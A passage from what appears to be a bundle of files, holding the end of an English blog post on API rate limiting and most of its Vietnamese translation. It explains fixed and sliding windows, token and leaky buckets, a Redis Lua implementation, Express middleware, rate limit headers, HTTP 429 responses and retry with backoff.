'lastRefill', now)\n redis.call('EXPIRE', key, 3600)\n return 1\n else\n return 0\n end\n `;\n\n const allowed = await redis.eval(script, 1, key, capacity, refillRate, now);\n\n return allowed === 1;\n}\n```\n\n**Why use Lua scripts?**\n\n- Ensures atomicity - The entire operation runs as a transaction\n- Reduces network round-trips\n- Avoids race conditions in concurrent environments\n\n### 3.2 Single Server with In-Memory Storage\n\nIf you only have one server instance, in-memory implementation is much simpler:\n\n```javascript\nconst rateLimits = new Map();\n\nfunction getRateLimit(userId) {\n if (!rateLimits.has(userId)) {\n rateLimits.set(userId, {\n tokens: 100,\n lastRefill: Date.now(),\n });\n }\n return rateLimits.get(userId);\n}\n\n// Cleanup old entries periodically\nsetInterval(() => {\n const now = Date.now();\n const timeout = 3600000; // 1 hour\n\n for (const [userId, data] of rateLimits.entries()) {\n if (now - data.lastRefill > timeout) {\n rateLimits.delete(userId);\n }\n }\n}, 60000); // Check every minute\n```\n\n### 3.3 Express Middleware Example\n\nIn practice, you typically implement rate limiting as middleware:\n\n```javascript\nconst rateLimit = require(\"express-rate-limit\");\n\n// Basic rate limiting\nconst limiter = rateLimit({\n windowMs: 15 * 60 * 1000, // 15 minutes\n max: 100, // Limit: 100 requests per windowMs\n message: \"Too many requests from this IP, please try again later.\",\n standardHeaders: true, // Return rate limit info in headers\n legacyHeaders: false,\n});\n\n// Apply to all routes\napp.use(limiter);\n\n// Different limits for different routes\nconst strictLimiter = rateLimit({\n windowMs: 60 * 1000,\n max: 10,\n message: \"Too many authentication attempts\",\n});\n\napp.post(\"/api/login\", strictLimiter, loginHandler);\n```\n\n### 3.4 Rate Limit Headers - Standard Practice\n\nWhen implementing rate limiting, **always** return HTTP headers so clients know their status:\n\n```javascript\nfunction setRateLimitHeaders(res, limit, remaining, reset) {\n // Maximum requests in window\n res.setHeader(\"X-RateLimit-Limit\", limit);\n\n // Remaining requests\n res.setHeader(\"X-RateLimit-Remaining\", remaining);\n\n // Timestamp when rate limit resets (Unix epoch seconds)\n res.setHeader(\"X-RateLimit-Reset\", reset);\n}\n\n// Example response headers:\n// X-RateLimit-Limit: 100\n// X-RateLimit-Remaining: 42\n// X-RateLimit-Reset: 1678886400\n```\n\n**Why is this important?**\n\n- Clients can implement intelligent backoff logic\n- Developers can debug rate limiting issues\n- Monitoring tools can track rate limit usage\n\n---\n\n## Part 4: Handling Rate Limited Users\n\n### 4.1 HTTP 429 Status Code\n\nWhen a user exceeds the rate limit, **always return HTTP 429 Too Many Requests**:\n\n```javascript\nfunction handleRateLimitExceeded(req, res, resetTime) {\n const retryAfter = Math.ceil((resetTime - Date.now()) / 1000);\n\n res\n .status(429)\n .set({\n \"Retry-After\": retryAfter, // Seconds until retry\n \"X-RateLimit-Reset\": Math.floor(resetTime / 1000),\n })\n .json({\n error: \"Too Many Requests\",\n message: \"You have exceeded the rate limit. Please try again later.\",\n retryAfter: retryAfter,\n });\n}\n```\n\n### 4.2 Retry-After Header\n\nThe **Retry-After header** tells the client when they can retry:\n\n```\nRetry-After: 120\n```\n\nOr using HTTP-date format:\n\n```\nRetry-After: Wed, 21 Oct 2026 07:28:00 GMT\n```\n\n**Best practice:** Use seconds for simplicity\n\n### 4.3 Clear Error Messages\n\nError responses should be clear and actionable:\n\n```json\n{\n \"error\": \"rate_limit_exceeded\",\n \"message\": \"You have made too many requests. Please wait before trying again.\",\n \"details\": {\n \"limit\": 100,\n \"window\": \"1 hour\",\n \"retryAfter\": 120,\n \"resetAt\": \"2026-03-17T14:30:00Z\"\n },\n \"documentation\": \"https://api.example.com/docs/rate-limits\"\n}\n```\n\n### 4.4 User Experience Considerations\n\n**Frontend Implementation:**\n\n```javascript\nasync function makeApiCall(url, options = {}) {\n try {\n const response = await fetch(url, options);\n\n if (response.status === 429) {\n const retryAfter = response.headers.get(\"Retry-After\");\n const resetTime = response.headers.get(\"X-RateLimit-Reset\");\n\n // Show user-friendly message\n showNotification(\n `Too many requests. Please wait ${retryAfter} seconds.`,\n \"warning\",\n );\n\n // Optional: Auto-retry after delay\n if (options.autoRetry) {\n await sleep(retryAfter * 1000);\n return makeApiCall(url, options);\n }\n\n throw new Error(\"Rate limit exceeded\");\n }\n\n return response.json();\n } catch (error) {\n console.error(\"API call failed:\", error);\n throw error;\n }\n}\n```\n\n**Exponential Backoff:**\n\nFor automated clients, implement exponential backoff:\n\n```javascript\nasync function fetchWithRetry(url, maxRetries = 3) {\n for (let i = 0; i < maxRetries; i++) {\n try {\n const response = await fetch(url);\n\n if (response.ok) {\n return response.json();\n }\n\n if (response.status === 429) {\n const retryAfter = parseInt(\n response.headers.get(\"Retry-After\") || \"60\",\n );\n\n // Exponential backoff with jitter\n const delay = retryAfter * 1000 * Math.pow(2, i) + Math.random() * 1000;\n\n console.log(`Rate limited. Retrying in ${delay}ms...`);\n await sleep(delay);\n continue;\n }\n\n throw new Error(`HTTP ${response.status}`);\n } catch (error) {\n if (i === maxRetries - 1) throw error;\n }\n }\n}\n```\n\n---\n\n## Key Takeaways\n\n1. **Rate limiting is essential** - Not an optional feature, but a core requirement for production APIs\n\n2. **Choose the right strategy:**\n - Fixed window: Simplest, OK for basic use cases\n - Sliding window: More accurate, good for most applications\n - Token bucket: Best for variable loads, allows reasonable bursts\n - Leaky bucket: Good for protecting downstream services with strict rate requirements\n\n3. **Use Redis for distributed systems** - Ensures consistency across multiple instances\n\n4. **Always return proper headers:**\n - `X-RateLimit-Limit`\n - `X-RateLimit-Remaining`\n - `X-RateLimit-Reset`\n - `Retry-After` (when returning 429)\n\n5. **Error handling matters:**\n - Status 429 with clear message\n - Provide retry timing information\n - Documentation links\n\n6. **Think about UX** - Rate limiting isn't just a technical feature, it affects user experience. Balance security/resource protection with usability.\n\n## Conclusion\n\nRate limiting is one of the most important patterns in API design. It protects resources, ensures fair usage, and prevents abuse - all critical for a stable and scalable production system.\n\nStart with a simple approach (fixed window or sliding window), monitor usage patterns, and evolve your strategy based on actual needs. And remember: rate limiting isn't just about limiting - it's about enabling sustainable, fair, and reliable service for all users.\n\n**Next steps:**\n\n- Implement rate limiting in your current API\n- Monitor rate limit metrics (rejection rate, popular limits hit, etc.)\n- Document rate limits clearly for API consumers\n- Consider different tiers (free, paid) with different limits\n- Set up alerts for unusual rate limit patterns\n\n**Resources:**\n\n- [RFC 6585 - HTTP Status Code 429](https://datatracker.ietf.org/doc/html/rfc6585)\n- [Redis Rate Limiting Patterns](https://redis.io/docs/manual/patterns/rate-limiter/)\n- [Express Rate Limit Library](https://www.npmjs.com/package/express-rate-limit)\n"}, {"name": "blog-post-vi.md", "type": "text", "content": "# Rate Limiting trong API: B\u1ea3o V\u1ec7 H\u1ec7 Th\u1ed1ng Kh\u1ecfi L\u1ea1m D\u1ee5ng\n\n> **D\u00e0nh cho developers x\u00e2y d\u1ef1ng v\u00e0 v\u1eadn h\u00e0nh API services**\n\nH\u00e3y t\u01b0\u1edfng t\u01b0\u1ee3ng b\u1ea1n \u0111ang v\u1eadn h\u00e0nh m\u1ed9t API service ph\u1ee5c v\u1ee5 h\u00e0ng ngh\u00ecn ng\u01b0\u1eddi d\u00f9ng. M\u1ed9t ng\u00e0y \u0111\u1eb9p tr\u1eddi, server c\u1ee7a b\u1ea1n b\u1eaft \u0111\u1ea7u qu\u00e1 t\u1ea3i, database ph\u1ea3n h\u1ed3i ch\u1eadm, v\u00e0 c\u00e1c user kh\u00e1c b\u1eaft \u0111\u1ea7u ph\u00e0n n\u00e0n v\u1ec1 service b\u1ecb ch\u1eadm. Khi b\u1ea1n ki\u1ec3m tra logs, b\u1ea1n ph\u00e1t hi\u1ec7n ra m\u1ed9t client \u0111ang g\u1eedi h\u00e0ng ngh\u00ecn requests m\u1ed7i gi\u00e2y - c\u00f3 th\u1ec3 l\u00e0 bug trong code c\u1ee7a h\u1ecd, ho\u1eb7c t\u1ec7 h\u01a1n, l\u00e0 m\u1ed9t cu\u1ed9c t\u1ea5n c\u00f4ng c\u1ed1 \u00fd.\n\n\u0110\u00e2y ch\u00ednh l\u00e0 l\u00fac **rate limiting** tr\u1edf n\u00ean quan tr\u1ecdng. N\u00f3 kh\u00f4ng ch\u1ec9 l\u00e0 m\u1ed9t t\u00ednh n\u0103ng \"nice-to-have\" m\u00e0 l\u00e0 m\u1ed9t ph\u1ea7n thi\u1ebft y\u1ebfu trong ki\u1ebfn tr\u00fac API hi\u1ec7n \u0111\u1ea1i.\n\n## Ph\u1ea7n 1: T\u1ea1i Sao C\u1ea7n Rate Limiting?\n\n### 1.1 B\u1ea3o V\u1ec7 T\u00e0i Nguy\u00ean H\u1ec7 Th\u1ed1ng\n\nAPI c\u1ee7a b\u1ea1n ch\u1ea1y tr\u00ean c\u00e1c t\u00e0i nguy\u00ean h\u1eefu h\u1ea1n - CPU, memory, database connections, network bandwidth. M\u1ed7i request \u0111\u1ec1u ti\u00eau t\u1ed1n c\u00e1c t\u00e0i nguy\u00ean n\u00e0y. N\u1ebfu kh\u00f4ng c\u00f3 gi\u1edbi h\u1ea1n, m\u1ed9t client n\u00e0o \u0111\u00f3 (d\u00f9 c\u1ed1 \u00fd hay v\u00f4 \u00fd) c\u00f3 th\u1ec3 ti\u00eau t\u1ed1n to\u00e0n b\u1ed9 t\u00e0i nguy\u00ean, khi\u1ebfn service c\u1ee7a b\u1ea1n kh\u00f4ng th\u1ec3 ph\u1ee5c v\u1ee5 c\u00e1c user kh\u00e1c.\n\n**V\u00ed d\u1ee5 th\u1ef1c t\u1ebf:**\n\n```javascript\n// M\u1ed9t v\u00f2ng l\u1eb7p v\u00f4 t\u00ecnh kh\u00f4ng c\u00f3 delay\nfor (let i = 0; i < 10000; i++) {\n fetch(\"https://api.example.com/users\").then((response) => response.json());\n}\n// 10,000 requests \u0111\u01b0\u1ee3c g\u1eedi c\u00f9ng l\u00fac!\n```\n\n### 1.2 Ng\u0103n Ch\u1eb7n L\u1ea1m D\u1ee5ng v\u00e0 T\u1ea5n C\u00f4ng\n\nRate limiting l\u00e0 tuy\u1ebfn ph\u00f2ng th\u1ee7 \u0111\u1ea7u ti\u00ean ch\u1ed1ng l\u1ea1i:\n\n- **DDoS attacks** - T\u1ea5n c\u00f4ng t\u1eeb ch\u1ed1i d\u1ecbch v\u1ee5\n- **Credential stuffing** - Th\u1eed nghi\u1ec7m \u0111\u0103ng nh\u1eadp v\u1edbi nhi\u1ec1u t\u00e0i kho\u1ea3n\n- **Web scraping** - Thu th\u1eadp d\u1eef li\u1ec7u tr\u00e1i ph\u00e9p\n- **API abuse** - S\u1eed d\u1ee5ng API v\u01b0\u1ee3t qu\u00e1 m\u1ee5c \u0111\u00edch \u0111\u01b0\u1ee3c ph\u00e9p\n\n### 1.3 \u0110\u1ea3m B\u1ea3o C\u00f4ng B\u1eb1ng (Fair Usage)\n\nKh\u00f4ng ph\u1ea3i t\u1ea5t c\u1ea3 users \u0111\u1ec1u b\u00ecnh \u0111\u1eb3ng v\u1ec1 nhu c\u1ea7u s\u1eed d\u1ee5ng, nh\u01b0ng m\u1ecdi user \u0111\u1ec1u x\u1ee9ng \u0111\u00e1ng \u0111\u01b0\u1ee3c ph\u1ee5c v\u1ee5. Rate limiting \u0111\u1ea3m b\u1ea3o r\u1eb1ng:\n\n- M\u1ed9t power user kh\u00f4ng th\u1ec3 l\u00e0m \u1ea3nh h\u01b0\u1edfng \u0111\u1ebfn tr\u1ea3i nghi\u1ec7m c\u1ee7a users kh\u00e1c\n- Resources \u0111\u01b0\u1ee3c ph\u00e2n ph\u1ed1i c\u00f4ng b\u1eb1ng gi\u1eefa c\u00e1c users\n- Free tier users kh\u00f4ng th\u1ec3 ti\u00eau t\u1ed1n t\u00e0i nguy\u00ean nh\u01b0 paid users\n\n### 1.4 Ki\u1ec3m So\u00e1t Chi Ph\u00ed\n\nN\u1ebfu API c\u1ee7a b\u1ea1n s\u1eed d\u1ee5ng d\u1ecbch v\u1ee5 b\u00ean th\u1ee9 ba (third-party services) c\u00f3 t\u00ednh ph\u00ed theo usage, rate limiting gi\u00fap:\n\n- Ki\u1ec3m so\u00e1t chi ph\u00ed c\u01a1 s\u1edf h\u1ea1 t\u1ea7ng\n- Tr\u00e1nh \"bill shock\" khi c\u00f3 usage spike b\u1ea5t th\u01b0\u1eddng\n- Align pricing tiers v\u1edbi actual resource costs\n\n---\n\n## Ph\u1ea7n 2: C\u00e1c Chi\u1ebfn L\u01b0\u1ee3c Rate Limiting\n\nC\u00f3 nhi\u1ec1u algorithms kh\u00e1c nhau \u0111\u1ec3 implement rate limiting, m\u1ed7i c\u00e1ch c\u00f3 \u01b0u v\u00e0 nh\u01b0\u1ee3c \u0111i\u1ec3m ri\u00eang. H\u00e3y c\u00f9ng t\u00ecm hi\u1ec3u chi ti\u1ebft c\u00e1c strategy ph\u1ed5 bi\u1ebfn nh\u1ea5t.\n\n### 2.1 Fixed Window Counter\n\n**C\u00e1ch ho\u1ea1t \u0111\u1ed9ng:**\n\nFixed window chia time th\u00e0nh c\u00e1c c\u1eeda s\u1ed5 c\u1ed1 \u0111\u1ecbnh (v\u00ed d\u1ee5: m\u1ed7i ph\u00fat, m\u1ed7i gi\u1edd). B\u1ea1n \u0111\u1ebfm s\u1ed1 requests trong m\u1ed7i window v\u00e0 reset counter khi window m\u1edbi b\u1eaft \u0111\u1ea7u.\n\n```\nWindow 1 (0-60s) Window 2 (60-120s) Window 3 (120-180s)\n[===========] [===========] [===========]\nCounter: 45 Counter: 0\u219252 Counter: 0\u219238\n```\n\n**Implementation \u0111\u01a1n gi\u1ea3n:**\n\n```javascript\nconst rateLimit = {\n windowStart: Date.now(),\n windowSize: 60000, // 1 ph\u00fat\n maxRequests: 100,\n counter: 0,\n};\n\nfunction allowRequest() {\n const now = Date.now();\n\n // Reset n\u1ebfu window m\u1edbi b\u1eaft \u0111\u1ea7u\n if (now - rateLimit.windowStart >= rateLimit.windowSize) {\n rateLimit.windowStart = now;\n rateLimit.counter = 0;\n }\n\n if (rateLimit.counter < rateLimit.maxRequests) {\n rateLimit.counter++;\n return true;\n }\n\n return false;\n}\n```\n\n**\u2705 \u01afu \u0111i\u1ec3m:**\n\n- C\u1ef1c k\u1ef3 \u0111\u01a1n gi\u1ea3n \u0111\u1ec3 implement\n- Memory efficient (ch\u1ec9 c\u1ea7n l\u01b0u counter v\u00e0 timestamp)\n- D\u1ec5 reasoning v\u1ec1 behavior\n\n**\u274c Nh\u01b0\u1ee3c \u0111i\u1ec3m:**\n\n- **Burst problem at window edges** - User c\u00f3 th\u1ec3 g\u1eedi 100 requests \u1edf cu\u1ed1i window 1, r\u1ed3i l\u1ea1i 100 requests ngay \u0111\u1ea7u window 2 = 200 requests trong 1 gi\u00e2y!\n\n```\nWindow 1 end Window 2 start\n \u2193 \u2193\n[..................] | [.....................]\n ^^^^^^^^\n 200 requests in 1 second!\n```\n\n### 2.2 Sliding Window Log\n\n**C\u00e1ch ho\u1ea1t \u0111\u1ed9ng:**\n\nThay v\u00ec c\u00e1c window c\u1ed1 \u0111\u1ecbnh, sliding window track timestamp c\u1ee7a t\u1eebng request. Khi c\u00f3 request m\u1edbi, b\u1ea1n lo\u1ea1i b\u1ecf c\u00e1c timestamps c\u0169 h\u01a1n window size v\u00e0 \u0111\u1ebfm s\u1ed1 requests c\u00f2n l\u1ea1i.\n\n```javascript\nconst requestLog = [];\nconst windowSize = 60000; // 1 ph\u00fat\nconst maxRequests = 100;\n\nfunction allowRequest() {\n const now = Date.now();\n\n // Lo\u1ea1i b\u1ecf requests c\u0169 h\u01a1n window size\n const validRequests = requestLog.filter(\n (timestamp) => now - timestamp < windowSize,\n );\n\n if (validRequests.length < maxRequests) {\n requestLog.push(now);\n return true;\n }\n\n return false;\n}\n```\n\n**Visualization:**\n\n```\n Current time\n \u2193\n|-------|-------|-------|-------|\n 54s 55s 56s 57s 58s\n \u2191 \u2191 \u2191\n Old (removed) Valid Valid\n```\n\n**\u2705 \u01afu \u0111i\u1ec3m:**\n\n- R\u1ea5t ch\u00ednh x\u00e1c - kh\u00f4ng c\u00f3 burst problem\n- True sliding window\n- D\u1ec5 debug (c\u00f3 th\u1ec3 xem to\u00e0n b\u1ed9 request history)\n\n**\u274c Nh\u01b0\u1ee3c \u0111i\u1ec3m:**\n\n- Memory intensive - ph\u1ea3i l\u01b0u timestamp c\u1ee7a m\u1ecdi request\n- C\u1ea7n cleanup logic \u0111\u1ec3 lo\u1ea1i b\u1ecf old entries\n- Kh\u00f4ng scale t\u1ed1t v\u1edbi high traffic\n\n### 2.3 Sliding Window Counter\n\n**C\u00e1ch ho\u1ea1t \u0111\u1ed9ng:**\n\n\u0110\u00e2y l\u00e0 hybrid approach k\u1ebft h\u1ee3p fixed window v\u1edbi weighted calculation. B\u1ea1n duy tr\u00ec counter cho window hi\u1ec7n t\u1ea1i v\u00e0 window tr\u01b0\u1edbc, r\u1ed3i t\u00ednh rate d\u1ef1a tr\u00ean weighted average.\n\n```javascript\nconst windows = {\n previous: { start: Date.now() - 60000, count: 80 },\n current: { start: Date.now(), count: 20 },\n};\n\nfunction allowRequest() {\n const now = Date.now();\n const windowSize = 60000;\n const maxRequests = 100;\n\n // N\u1ebfu current window \u0111\u00e3 h\u1ebft th\u1eddi gian\n if (now - windows.current.start >= windowSize) {\n windows.previous = windows.current;\n windows.current = { start: now, count: 0 };\n }\n\n // T\u00ednh % overlap v\u1edbi previous window\n const elapsedInCurrent = now - windows.current.start;\n const overlapPercent = (windowSize - elapsedInCurrent) / windowSize;\n\n // Weighted count\n const estimatedCount =\n windows.previous.count * overlapPercent + windows.current.count;\n\n if (estimatedCount < maxRequests) {\n windows.current.count++;\n return true;\n }\n\n return false;\n}\n```\n\n**\u2705 \u01afu \u0111i\u1ec3m:**\n\n- Ch\u00ednh x\u00e1c h\u01a1n fixed window\n- Memory efficient h\u01a1n sliding log\n- Gi\u1ea3m thi\u1ec3u burst problem\n\n**\u274c Nh\u01b0\u1ee3c \u0111i\u1ec3m:**\n\n- Ph\u1ee9c t\u1ea1p h\u01a1n \u0111\u1ec3 implement\n- V\u1eabn c\u00f3 approximation (kh\u00f4ng 100% ch\u00ednh x\u00e1c)\n\n### 2.4 Token Bucket\n\n**C\u00e1ch ho\u1ea1t \u0111\u1ed9ng:**\n\nH\u00e3y t\u01b0\u1edfng t\u01b0\u1ee3ng m\u1ed9t bucket (x\u00f4) ch\u1ee9a tokens. Tokens \u0111\u01b0\u1ee3c th\u00eam v\u00e0o bucket v\u1edbi m\u1ed9t rate c\u1ed1 \u0111\u1ecbnh. M\u1ed7i request ti\u00eau t\u1ed1n m\u1ed9t token. N\u1ebfu bucket r\u1ed7ng, request b\u1ecb reject.\n\n```\nBucket capacity: 100 tokens\nRefill rate: 10 tokens/second\n\nTime 0s: [====================] 100 tokens\n\u2193 20 requests\nTime 1s: [================ ] 90 tokens (80 used, +10 refilled)\n\u2193 5 requests\nTime 2s: [================= ] 95 tokens (85 used, +10 refilled)\n```\n\n**Implementation:**\n\n```javascript\nclass TokenBucket {\n constructor(capacity, refillRate) {\n this.capacity = capacity;\n this.tokens = capacity;\n this.refillRate = refillRate; // tokens per second\n this.lastRefill = Date.now();\n }\n\n refill() {\n const now = Date.now();\n const timePassed = (now - this.lastRefill) / 1000; // seconds\n const tokensToAdd = timePassed * this.refillRate;\n\n this.tokens = Math.min(this.capacity, this.tokens + tokensToAdd);\n this.lastRefill = now;\n }\n\n allowRequest(cost = 1) {\n this.refill();\n\n if (this.tokens >= cost) {\n this.tokens -= cost;\n return true;\n }\n\n return false;\n }\n}\n\n// Usage\nconst bucket = new TokenBucket(100, 10);\nif (bucket.allowRequest()) {\n // Process request\n}\n```\n\n**\u2705 \u01afu \u0111i\u1ec3m:**\n\n- **Cho ph\u00e9p bursts** - N\u1ebfu user kh\u00f4ng d\u00f9ng h\u1ebft tokens, h\u1ecd c\u00f3 th\u1ec3 \"t\u00edch l\u0169y\" \u0111\u1ec3 burst sau\n- Linh ho\u1ea1t - C\u00f3 th\u1ec3 assign different costs cho different operations\n- Smooth long-term rate\n\n**\u274c Nh\u01b0\u1ee3c \u0111i\u1ec3m:**\n\n- C\u00f3 th\u1ec3 cho ph\u00e9p bursts l\u1edbn n\u1ebfu bucket capacity cao\n- C\u1ea7n tune c\u1ea9n th\u1eadn capacity v\u00e0 refill rate\n\n**Use case t\u1ed1t:** API v\u1edbi variable load patterns, n\u01a1i users c\u1ea7n burst occasionally\n\n### 2.5 Leaky Bucket\n\n**C\u00e1ch ho\u1ea1t \u0111\u1ed9ng:**\n\nT\u01b0\u01a1ng t\u1ef1 token bucket, nh\u01b0ng ng\u01b0\u1ee3c l\u1ea1i: requests \u0111\u01b0\u1ee3c th\u00eam v\u00e0o queue (bucket) v\u00e0 \u0111\u01b0\u1ee3c x\u1eed l\u00fd v\u1edbi m\u1ed9t rate c\u1ed1 \u0111\u1ecbnh - gi\u1ed1ng nh\u01b0 n\u01b0\u1edbc \"r\u00f2 r\u1ec9\" t\u1eeb m\u1ed9t bucket b\u1ecb th\u1ee7ng.\n\n```\nRequests in \u2192 [=====Queue=====] \u2192 Process out (fixed rate)\n [ R1 R2 R3 R4 ]\n \u2193 \u2193 \u2193 \u2193\n Process 1 request/second\n```\n\n**Implementation:**\n\n```javascript\nclass LeakyBucket {\n constructor(capacity, leakRate) {\n this.capacity = capacity;\n this.queue = [];\n this.leakRate = leakRate; // requests per second\n this.lastLeak = Date.now();\n }\n\n leak() {\n const now = Date.now();\n const timePassed = (now - this.lastLeak) / 1000;\n const leakCount = Math.floor(timePassed * this.leakRate);\n\n // Lo\u1ea1i b\u1ecf requests \u0111\u00e3 \u0111\u01b0\u1ee3c \"leaked\"\n this.queue.splice(0, leakCount);\n this.lastLeak = now;\n }\n\n allowRequest(request) {\n this.leak();\n\n if (this.queue.length < this.capacity) {\n this.queue.push(request);\n return true;\n }\n\n return false; // Bucket \u0111\u1ea7y, reject request\n }\n}\n```\n\n**\u2705 \u01afu \u0111i\u1ec3m:**\n\n- **Smooth, constant output rate** - B\u1ea3o v\u1ec7 downstream services\n- C\u00f3 th\u1ec3 queue requests thay v\u00ec reject ngay\n- Predictable load on backend\n\n**\u274c Nh\u01b0\u1ee3c \u0111i\u1ec3m:**\n\n- Requests c\u00f3 th\u1ec3 b\u1ecb delay (v\u00ec \u0111\u01b0\u1ee3c queue)\n- C\u1ea7n qu\u1ea3n l\u00fd queue (memory, timeouts)\n- C\u00f3 th\u1ec3 g\u00e2y latency cao cho users\n\n**Use case t\u1ed1t:** Khi b\u1ea1n c\u1ea7n protect downstream service v\u1edbi strict rate requirements\n\n---\n\n## Ph\u1ea7n 3: Implementation trong Production\n\n### 3.1 Distributed Systems v\u1edbi Redis\n\nKhi application c\u1ee7a b\u1ea1n ch\u1ea1y tr\u00ean nhi\u1ec1u servers, b\u1ea1n c\u1ea7n shared state \u0111\u1ec3 track rate limits across all instances. Redis l\u00e0 solution ph\u1ed5 bi\u1ebfn nh\u1ea5t.\n\n**Token Bucket v\u1edbi Redis:**\n\n```javascript\nconst Redis = require(\"ioredis\");\nconst redis = new Redis();\n\nasync function allowRequest(userId, capacity, refillRate) {\n const key = `rate_limit:${userId}`;\n const now = Date.now();\n\n // Lua script \u0111\u1ec3 \u0111\u1ea3m b\u1ea3o atomicity\n const script = `\n local key = KEYS[1]\n local capacity = tonumber(ARGV[1])\n local refillRate = tonumber(ARGV[2])\n local now = tonumber(ARGV[3])\n \n local bucket = redis.call('HMGET', key, 'tokens', 'lastRefill')\n local tokens = tonumber(bucket[1]) or capacity\n local lastRefill = tonumber(bucket[2]) or now\n \n -- Refill tokens\n local timePassed = (now - lastRefill) / 1000\n local tokensToAdd = timePassed * refillRate\n tokens = math.min(capacity, tokens + tokensToAdd)\n \n -- Check if request allowed\n if tokens >= 1 then\n tokens = tokens - 1\n redis.call('HMSET', key, 'tokens', tokens, 'lastRefill', now)\n redis.call('EXPIRE', key, 3600)\n return 1\n else\n return 0\n end\n `;\n\n const allowed = await redis.eval(script, 1, key, capacity, refillRate, now);\n\n return allowed === 1;\n}\n```\n\n**T\u1ea1i sao d\u00f9ng Lua scripts?**\n\n- \u0110\u1ea3m b\u1ea3o atomicity - To\u00e0n b\u1ed9 operation ch\u1ea1y nh\u01b0 m\u1ed9t transaction\n- Gi\u1ea3m network round-trips\n- Tr\u00e1nh race conditions trong concurrent environments\n\n### 3.2 Single Server v\u1edbi In-Memory Storage\n\nN\u1ebfu b\u1ea1n ch\u1ec9 c\u00f3 m\u1ed9t server instance, in-memory implementation \u0111\u01a1n gi\u1ea3n h\u01a1n nhi\u1ec1u:\n\n```javascript\nconst rateLimits = new Map();\n\nfunction getRateLimit(userId) {\n if (!rateLimits.has(userId)) {\n rateLimits.set(userId, {\n tokens: 100,\n lastRefill: Date.now(),\n });\n }\n return rateLimits.get(userId);\n}\n\n// Cleanup old entries periodically\nsetInterval(() => {\n const now = Date.now();\n const timeout = 3600000; // 1 hour\n\n for (const [userId, data] of rateLimits.entries()) {\n if (now - data.lastRefill > timeout) {\n rateLimits.delete(userId);\n }\n }\n}, 60000); // Check every minute\n```\n\n### 3.3 Express Middleware Example\n\nTh\u1ef1c t\u1ebf, b\u1ea1n th\u01b0\u1eddng implement rate limiting nh\u01b0 m\u1ed9t middleware:\n\n```javascript\nconst rateLimit = require(\"express-rate-limit\");\n\n// Basic rate limiting\nconst limiter = rateLimit({\n windowMs: 15 * 60 * 1000, // 15 minutes\n max: 100, // Limit: 100 requests per windowMs\n message: \"Too many requests from this IP, please try again later.\",\n standardHeaders: true, // Return rate limit info in headers\n legacyHeaders: false,\n});\n\n// Apply to all routes\napp.use(limiter);\n\n// Different limits for different routes\nconst strictLimiter = rateLimit({\n windowMs: 60 * 1000,\n max: 10,\n message: \"Too many authentication attempts\",\n});\n\napp.post(\"/api/login\", strictLimiter, loginHandler);\n```\n\n### 3.4 Rate Limit Headers - Standard Practice\n\nKhi implement rate limiting, **lu\u00f4n lu\u00f4n** tr\u1ea3 v\u1ec1 c\u00e1c HTTP headers \u0111\u1ec3 clients bi\u1ebft status:\n\n```javascript\nfunction setRateLimitHeaders(res, limit, remaining, reset) {\n // S\u1ed1 requests t\u1ed1i \u0111a trong window\n res.setHeader(\"X-RateLimit-Limit\", limit);\n\n // S\u1ed1 requests c\u00f2n l\u1ea1i\n res.setHeader(\"X-RateLimit-Remaining\", remaining);\n\n // Timestamp khi rate limit reset (Unix epoch seconds)\n res.setHeader(\"X-RateLimit-Reset\", reset);\n}\n\n// Example response headers:\n// X-RateLimit-Limit: 100\n// X-RateLimit-Remaining: 42\n// X-RateLimit-Reset: 1678886400\n```\n\n**T\u1ea1i sao quan tr\u1ecdng?**\n\n- Clients c\u00f3 th\u1ec3 implement intelligent backoff logic\n- Developers c\u00f3 th\u1ec3 debug rate limiting issues\n- Monitoring tools c\u00f3 th\u1ec3 track rate limit usage\n\n---\n\n## Ph\u1ea7n 4: X\u1eed L\u00fd Khi User V\u01b0\u1ee3t Limit\n\n### 4.1 HTTP 429 Status Code\n\nKhi user v\u01b0\u1ee3t qu\u00e1 rate limit, **lu\u00f4n return HTTP 429 Too Many Requests**:\n\n```javascript\nfunction handleRateLimitExceeded(req, res, resetTime) {\n const retryAfter = Math.ceil((resetTime - Date.now()) / 1000);\n\n res\n .status(429)\n .set({\n \"Retry-After\": retryAfter, // Seconds until retry\n \"X-RateLimit-Reset\": Math.floor(resetTime / 1000),\n })\n .json({\n error: \"Too Many Requests\",\n message: \"You have exceeded the rate limit. Please try again later.\",\n retryAfter: retryAfter,\n });\n}\n```\n\n### 4.2 Retry-After Header\n\n**Retry-After header** cho client bi\u1ebft khi n\u00e0o h\u1ecd c\u00f3 th\u1ec3 retry:\n\n```\nRetry-After: 120\n```\n\nHo\u1eb7c s\u1eed d\u1ee5ng HTTP-date:\n\n```\nRetry-After: Wed, 21 Oct 2026 07:28:00 GMT\n```\n\n**Best practice:** S\u1eed d\u1ee5ng seconds \u0111\u1ec3 \u0111\u01a1n gi\u1ea3n h\u01a1n\n\n### 4.3 Clear Error Messages\n\nError response n\u00ean clear v\u00e0 actionable:\n\n```json\n{\n \"error\": \"rate_limit_exceeded\",\n \"message\": \"You have made too many requests. Please wait before trying again.\",\n \"details\": {\n \"limit\": 100,\n \"window\": \"1 hour\",\n \"retryAfter\": 120,\n \"resetAt\": \"2026-03-17T14:30:00Z\"\n },\n \"documentation\": \"https://api.example.com/docs/rate-limits\"\n}\n```\n\n### 4.4 User Experience Considerations\n\n**Frontend Implementation:**\n\n```javascript\nasync function makeApiCall(url, options = {}) {\n try {\n const response = await fetch(url, options);\n\n if (response.status === 429) {\n const retryAfter = response.headers.get(\"Retry-After\");\n const resetTime = response.headers.get(\"X-RateLimit-Reset\");\n\n // Show user-friendly message\n showNotification(\n `Too many requests.
